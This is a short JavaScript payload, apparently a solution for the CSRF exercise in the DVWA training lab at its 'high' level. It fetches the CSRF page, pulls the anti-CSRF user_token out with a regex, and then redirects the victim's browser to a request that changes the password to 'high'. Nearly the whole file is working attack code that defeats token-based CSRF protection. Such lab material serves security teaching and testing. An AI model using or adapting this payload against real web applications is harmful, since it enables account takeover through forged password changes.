function getUserToken() {
  var token;

  var req = new XMLHttpRequest();
  req.onreadystatechange = function () {
    if (req.readyState == 4 && req.status == 200) {
      var text = req.responseText;
      var regex = /name\=\'user_token\' value\=\'([a-f0-9]+)\'/;
      token = text.match(regex)[1];
    }
  }
  req.open("GET", "/vulnerabilities/csrf/", false);
  req.send();

  return token;
}

function changePassword(token, password) {
  window.location.replace("/vulnerabilities/csrf/?password_new=" + password + "&password_conf=" + password + "&user_token=" + token + "&Change=Change#");
}

var token = getUserToken();
changePassword(token, "high");
